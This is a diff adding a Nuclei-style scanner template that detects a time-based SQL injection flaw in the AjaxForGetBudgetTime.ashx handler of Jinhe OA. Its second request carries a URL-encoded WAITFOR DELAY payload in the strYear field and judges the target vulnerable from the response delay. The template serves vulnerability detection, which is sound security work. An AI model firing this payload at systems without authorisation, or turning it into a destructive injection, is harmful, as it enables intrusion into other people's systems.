@@ -1,0 +1,42 @@
+id: jinheOA-AjaxForGetBudgetTime-sql
+
+info:
+  name: 金和OA AjaxForGetBudgetTime.ashx SQL注入漏洞
+  author: jinheOA
+  severity: high
+  tags: jinheOA
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/AjaxForGetBudgetTime.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        strType=getTime&strTime=&strYear=
+
+      - |
+        POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/AjaxForGetBudgetTime.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Content-Type: application/x-www-form-urlencoded
+
+        strType=getTime&strTime=&strYear=%31%27%57%41%49%54%46%4f%52%20%44%45%4c%41%59%27%30%3a%30%3a%34%27%2d%2d
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration_1 < 2'
+          - 'duration_2 >= 4'
+          - 'duration_2 <= 6'
+        condition: and
+      - type: word
+        part: body
+        words:
+          - '全部'
+
